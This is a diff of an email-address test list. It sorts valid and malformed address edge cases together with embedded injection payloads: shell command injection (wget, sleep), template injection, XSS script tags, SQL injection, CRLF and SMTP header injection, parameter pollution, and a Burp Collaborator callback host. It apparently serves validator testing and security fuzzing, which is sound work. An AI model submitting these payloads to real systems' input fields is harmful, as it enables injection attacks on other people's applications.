@@ -1,33 +1,93 @@
-`wget%20baidu.com/xxxx`@qq.com
-`sleep 3`/xxxx`@qq.com
-"`sleep 3`"@qq.com
-name@"`sleep 3`"qq.com
-name@{`slee 3`}qq.com
-name@qq.com(`sleep 3`)
-name "($(sleep${IFS}3))"qq.com
-name "($(sleep 3))"qq.com
-test+{${{10001*2}}}@qq.com
-"<%= 10001*2%>"@qq.com
-"'-- %20"@qq.com
-"{{10001*2}}"@qq.com
-"{{'10001*2'}}"@qq.com
-{$smarty.version}@qq.com
-"{$smarty.version}"@qq.com
-name@"{{'10001*2'}}"qq.com
-name@{{10001*2}}qq.com
-name@"{{10001*2}}"qq.com
-@(10001+1)@qq.com
-"@(10001+1)"@qq.com
-aaa@"@(10001+1)"qq.com
-test+(<script>alert(0)</script>)@example.com
-test@example(<script>alert(0)</script>).com
-"<script>alert(0)</script>"@example.com
-"<%= 7 * 7 %>"@example.com
-test+(${{7*7}})@example.com
+ notallowed@example.com
+_jacco@address.com
+!def!abc%dfg@address.com
+.email@address.com
+" "@address.org
 "' OR 1=1 -- '"@example.com
-"mail'); DROP TABLE users;--"@example.com
-john.doe@abc123.burpcollaborator.net
-john.doe@[127.0.0.1]
-victim&email=attacker@example.com
+"'-- %20"@qq.com
+“(),:;<>[\]@address.com
+"()<>[]:,;@\\\"!#$%&'*+-/=?^_`{}| ~.a"@address.org
+"{{'10001*2'}}"@qq.com
+"{{10001*2}}"@qq.com
+"{$smarty.version}"@qq.com
+"@(10001+1)"@qq.com
 "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
+"`sleep 3`"@qq.com
+"<%= 10001*2%>"@qq.com
+"<%= 7 * 7 %>"@example.com
+"<script>alert(0)</script>"@example.com
+“email”@address.com
+"Jacco van Tuijl"@address.com
+"jacco.vantuijl.@.address.com"@address.com
+"Jacco@test"@address.com
+"Jacco\@test"@address.com
+"Jacco\\test"@address.com
+"mail'); DROP TABLE users;--"@example.com
 "recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+{$smarty.version}@qq.com
+{jacco'vantuijl}@address.server
+@(10001+1)@qq.com
+@address.com
+\$A12345@address.com
+#!$%&'*+-/=?^_`{}|~@address.org
+#@%^%#$@#$@#.com
+`sleep 3`/xxxx`@qq.com
+`wget%20baidu.com/xxxx`@qq.com
+0123456789@address.com
+a.long.email.address.test@dept.address.com
+a"b(c)d,e:f;g<h>i[j\k]l@example.com
+aaa@"@(10001+1)"qq.com
+Abc..123@address.com
+abcdefghijklmnopqrstuvwxyz!#$%&'*+-/=?^_`{|}~.0123456789@abcdefghijklmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.com
+address@üñîçøðé.com
+email..email@address.com
+email.@address.com
+email.address.com
+email@-address.com
+email@111.222.333.44444
+email@addrese.com;secondemail@address.com
+email@address-one.com
+email@address..com
+email@address.co.jp
+email@address.com (Jacco van Tuijl)
+email@address.name
+email@address@example.com
+email@eaddress.com
+email@subdomain.address.com
+firstname-lastname@address.com
+firstname.lastname@address.com
+firstname+lastname@address.com
+Jacco Van Tuijl <email@example.com>
+jacco"van"tuijl@address.com
+jacco@mailserver1
+Jacco/van=Tuijl@address.com
+jacco\ van"someting"tuijl\example@address.com
+john.doe@[127.0.0.1]
+john.doe@abc123.burpcollaborator.net
+justastring
+much."more\ unusual"@address.com
+name "($(sleep 3))"qq.com
+name "($(sleep${IFS}3))"qq.com
+name@"{{'10001*2'}}"qq.com
+name@"{{10001*2}}"qq.com
+name@"`sleep 3`"qq.com
+name@[129.129.129.129]
+name@{{10001*2}}qq.com
+name@{`slee 3`}qq.com
+name@129.129.129.129
+name@qq.com(`sleep 3`)
+notallowed@example.com 
+sql'or'1'='1'or'test@email.com
+sql"or"1"="1"or"test@email.com
+test@example(<script>alert(0)</script>).com
+test+(<script>alert(0)</script>)@example.com
+test+(${{7*7}})@example.com
+test+{${{10001*2}}}@qq.com
+this is"not\allowed@example.com
+üñîçøðé@address.com
+üñîçøðé@üñîçøðé.com
+very."(),:;<>[]".VERY."very@\\ "very".unusual@strange.address.com
+very.unusual."@".unusual.com@address.com
+victim&email=attacker@example.com
+xss"><script>alert(1)</script><"test@address.com
+うえあいお@address.com
